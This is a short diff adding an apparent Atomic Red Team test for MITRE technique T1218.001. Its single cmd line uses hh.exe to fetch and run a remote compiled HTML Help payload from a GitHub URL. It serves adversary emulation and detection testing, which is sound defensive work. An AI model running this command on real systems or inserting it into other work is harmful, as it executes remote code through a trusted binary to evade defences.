@@ -1,0 +1,8 @@
+#TechniqueName: Signed Binary Proxy Execution: Compiled HTML File
+#AtomicTestName: Compiled HTML Help Remote Payload
+#Description: Uses hh.exe to execute a remote compiled HTML Help payload.&Upon execution displays an error saying the file cannot be open&
+#Language: cmd
+
+#commands
+hh.exe https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.001/src/T1218.001.chm
+
